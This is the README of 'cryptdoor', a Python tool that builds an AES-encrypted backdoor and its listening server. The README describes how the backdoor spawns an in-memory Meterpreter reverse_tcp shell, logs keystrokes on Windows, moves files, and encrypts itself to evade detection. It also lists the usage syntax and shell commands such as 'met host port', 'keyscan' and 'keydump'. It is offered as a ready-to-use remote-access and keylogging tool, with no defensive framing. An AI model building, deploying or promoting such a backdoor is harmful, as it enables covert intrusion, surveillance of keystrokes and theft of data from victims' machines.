cryptdoor
=========

AES encrypted python backdoor that communicates AES encrypted data.
Shell has the ability to spawn a meterpreter reverse_tcp into memory using VirtualAlloc (taken from Veil-Evasion).
We can also download and upload files over the secure AES encrypted connection.
Keylogging is also implemented for windows using pyHook and the keystrokes are transmitted over the secure AES encrypted connection.
All communications apart from ones meterpreter makes are encrypted with AES.
On top of this the script itself is encrypted with AES and decrypts itself in memory (taken from pyherion).

Usage
=========

cryptdoor.py will make the backdoor and server.
The syntax is:

	./cryptdoor.py host port (backdoorname) (servername)

host and port refer to the host and port of the listening server.
If you don't include backdoorname and servername, files will be named backdoor.py and server.py.


	 AEShell options:
	  download filepath   -  Download a file from remote system to pwd
	  upload filepath     -  Upload a file to remote pwd
	  run command         -  Run a command in the background
	  met host port       -  Execute a reverse_tcp meterpreter to host:port
	  keyscan             -  Start recording keystrokes
	  keydump             -  Dump recorded keystrokes
	  keyclear            -  Clear the keystroke buffer